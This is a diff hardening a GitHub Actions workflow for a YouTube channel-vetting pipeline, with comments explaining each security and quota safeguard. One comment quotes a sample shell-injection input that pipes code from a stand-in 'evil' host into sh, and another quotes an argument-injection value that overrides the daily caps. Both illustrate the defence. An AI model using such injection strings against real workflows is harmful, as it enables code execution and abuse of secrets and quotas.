@@ -22,9 +22,53 @@ on:
         required: false
         default: ""
 
+# Only ever ONE run of this pipeline at a time, repo-wide.
+#
+# Two concurrent runners are the single most likely way to blow the 10,000
+# unit/day YouTube budget. Every guard in this pipeline is per-process or
+# read-then-write: quota_tracker.py keeps its ledger in a local
+# quota_log.json (one per runner, neither seeing the other's spend), and
+# count_added_today() reads Airtable BEFORE either run has pushed anything.
+# So a workflow_dispatch fired while the 09:00 cron is still going gives two
+# runs that both read the same low "added today" count, both compute a FULL
+# day's headroom, and both spend a full day's quota against it — up to 2x
+# the daily row cap and 2x the quota.
+#
+# cancel-in-progress is deliberately FALSE. Cancelling mid-flight is the
+# worst outcome available: the run would be SIGKILLed somewhere between
+# spending search.list units and writing quota_log.json, and between
+# pushing Airtable rows and having them counted, stranding both the quota
+# ledger and the Airtable state. Queueing the second run behind the first
+# costs nothing but wall-clock time; cancelling the first loses money.
+concurrency:
+  group: channel-vetting
+  cancel-in-progress: false
+
+# This job needs NO repo access whatsoever: it checks out public code,
+# installs deps, and talks to Airtable + YouTube over HTTPS. It never
+# pushes a commit, publishes a package, comments on a PR, or reads another
+# repo. The default GITHUB_TOKEN scope is workflow- and repo-settings
+# dependent and is still `contents: write` on plenty of older repos, so the
+# token handed to this job is spelled out rather than inherited. That
+# matters here more than usual because the job also holds AIRTABLE_TOKEN
+# and YOUTUBE_API_KEY in env for the whole run: anything that manages to
+# execute inside a step already has those, and there is no reason to hand
+# it repo write on top.
+permissions: {}
+
 jobs:
   run-pipeline:
     runs-on: ubuntu-latest
+
+    # A normal full run is minutes. With USE_PLAYWRIGHT_STEALTH on it is
+    # ~40 candidates x several link probes, each with its own page load and
+    # settle wait (SETTLE_TIMEOUT_MS), so the realistic ceiling is tens of
+    # minutes — but a page that never settles, a hung Chromium, or a stalled
+    # Airtable pagination loop has no internal deadline at all. Without this
+    # the job would sit on a runner for GitHub's 6-hour default, and with
+    # `cancel-in-progress: false` above it would also block every queued
+    # run behind it for those 6 hours.
+    timeout-minutes: 60
 
     # Identical for both run steps below, so it lives here rather than
     # being repeated (and kept in sync) twice.
@@ -53,16 +97,30 @@ jobs:
       PROSPECT_DAY_TZ: America/Toronto
 
     steps:
+      # Every action below is pinned to a full commit SHA, with the release
+      # it corresponds to in the trailing comment. A tag like `@v4` is a
+      # MUTABLE git ref: whoever controls the action's repo (or anyone who
+      # compromises it) can retag it at any time and every run of this
+      # workflow silently picks up the new code — inside a job that has
+      # AIRTABLE_TOKEN and YOUTUBE_API_KEY sitting in env. A SHA cannot be
+      # moved. Cost of the trade: Dependabot/Renovate (or a human) has to
+      # bump these deliberately, which is the point.
       - name: Check out repo
-        uses: actions/checkout@v4
+        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
 
       - name: Set up Python
-        uses: actions/setup-python@v5
+        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0
         with:
           python-version: "3.12"
 
+      # --require-hashes refuses to install any artifact whose sha256 is not
+      # listed in requirements.txt, so a hijacked PyPI account or a
+      # substituted mirror artifact fails the install instead of running
+      # arbitrary code next to the tokens in env. See the header of
+      # requirements.txt for how to regenerate the file — adding or bumping
+      # ANY dependency without regenerating it will fail this step.
       - name: Install dependencies
-        run: pip install -r requirements.txt
+        run: pip install --require-hashes -r requirements.txt
 
       # Persists quota_log.json / search_cache.json / external_handles_cache.json
       # across runs so a same-day manual re-run (workflow_dispatch) doesn't
@@ -73,13 +131,35 @@ jobs:
       # load-bearing for run time even on a once-daily schedule: without it
       # every scheduled run re-paginates ~18k Airtable rows across the 4
       # external tables (external_dedupe.py) before any discovery starts.
+      #
+      # Split restore/save rather than one `actions/cache` step. The
+      # combined step only saves on a SUCCESSFUL job, and the runs whose
+      # spend you least want to forget are the failures: main.py exits 1
+      # when fetch_blocklist() or the dedupe set can't be read, and by then
+      # discovery may already have spent hundreds of units. The save step
+      # below is `if: always()` for exactly that.
+      #
+      # NOT a store of record. A GitHub Actions cache is best-effort: it is
+      # evicted after 7 idle days, and evicted least-recently-used once the
+      # repo passes the 10GB cache cap, with no signal to the run that it
+      # went missing. A run that comes up empty here behaves like a first
+      # run — fresh ledger, cold caches — so treat this as an optimisation
+      # and a courtesy, and rely on quota_tracker.py's Pacific-Time day key
+      # plus Airtable's own "Date Added" counts for correctness.
       - name: Restore quota + search + external-handles cache
-        uses: actions/cache@v4
+        uses: actions/cache/restore@0057852bfaa89a56745cba8c7296529d2fc39830 # v4.3.0
         with:
           path: |
             quota_log.json
             search_cache.json
             external_handles_cache.json
+          # The exact key intentionally never hits (github.run_id is unique
+          # per run) — it exists so the SAVE step below always has a fresh,
+          # unclaimed key to write to. A cache key is immutable once
+          # written, so reusing a stable key would make every save after the
+          # first a silent no-op. The restore-keys prefix is what actually
+          # loads state: it takes the most recent cache whose key starts
+          # with it.
           key: channel-vetting-state-${{ github.run_id }}
           restore-keys: |
             channel-vetting-state-
@@ -106,14 +186,75 @@ jobs:
       # sweep, and making it the standing behaviour would have every daily
       # run re-reading the same already-consumed pool for 100 units a
       # keyword (see "Discovery window" in CLAUDE.md).
+      #
+      # The value reaches the shell through `env:` and NEVER through a
+      # ${{ }} interpolation inside `run:`. Keep it that way: ${{ }} is
+      # pasted into the script before bash sees it, so `"; curl evil | sh #`
+      # in the input box would be executed. Via env: it is just a string in
+      # a variable.
+      #
+      # env: alone is not sufficient, though. `$DAYS_BACK` is UNQUOTED in
+      # the ${:+...} expansion, so bash word-splits it into separate argv
+      # entries — an input of `7 --daily-cap 9999` would reach main.py as
+      # three arguments and quietly override BOTH daily caps, spending a
+      # day's quota and filling the tables past the row cap. That is
+      # argument injection, not shell injection, and quoting alone would
+      # only turn it into an argparse error at the far end. So the value is
+      # validated as digits-only here and the run aborts before main.py is
+      # invoked at all.
+      #
+      # Note the empty case is ACCEPTED, not rejected: blank is the normal
+      # state on every scheduled run. Only a non-empty non-numeric value is
+      # an error.
       - name: Run pipeline (full)
         if: github.event_name == 'schedule' || github.event.inputs.test_mode != 'true'
         env:
           DAYS_BACK: ${{ inputs.days_back }}
-        run: python main.py ${DAYS_BACK:+--days-back $DAYS_BACK}
+        run: |
+          case "$DAYS_BACK" in
+            "") ;;
+            *[!0-9]*)
+              echo "::error::days_back must be digits only (got: '$DAYS_BACK')"
+              exit 1
+              ;;
+          esac
+          python main.py ${DAYS_BACK:+--days-back "$DAYS_BACK"}
 
+      # Same validation as the step above — duplicated rather than factored
+      # into an earlier step on purpose, so neither run path can ever be
+      # reached without it (a shared step could be skipped by an `if:` and
+      # the guard would vanish silently).
       - name: Run pipeline (test mode)
         if: github.event.inputs.test_mode == 'true'
         env:
           DAYS_BACK: ${{ inputs.days_back }}
-        run: python main.py --test ${DAYS_BACK:+--days-back $DAYS_BACK}
+        run: |
+          case "$DAYS_BACK" in
+            "") ;;
+            *[!0-9]*)
+              echo "::error::days_back must be digits only (got: '$DAYS_BACK')"
+              exit 1
+              ;;
+          esac
+          python main.py --test ${DAYS_BACK:+--days-back "$DAYS_BACK"}
+
+      # `if: always()` is the whole reason the cache step is split in two.
+      # A failed run has usually already spent quota — main.py aborts with
+      # SystemExit(1) when fetch_blocklist() or the external dedupe set
+      # can't be read, and discovery runs before neither of those — so
+      # dropping quota_log.json on failure is precisely the case where the
+      # next run would re-spend from an apparently clean ledger.
+      #
+      # Placed last so it captures whatever the run steps wrote. Saving is
+      # best-effort by design: a missing path or an unwritable cache logs a
+      # warning and does not fail the job (see the "NOT a store of record"
+      # note on the restore step).
+      - name: Save quota + search + external-handles cache
+        if: always()
+        uses: actions/cache/save@0057852bfaa89a56745cba8c7296529d2fc39830 # v4.3.0
+        with:
+          path: |
+            quota_log.json
+            search_cache.json
+            external_handles_cache.json
+          key: channel-vetting-state-${{ github.run_id }}
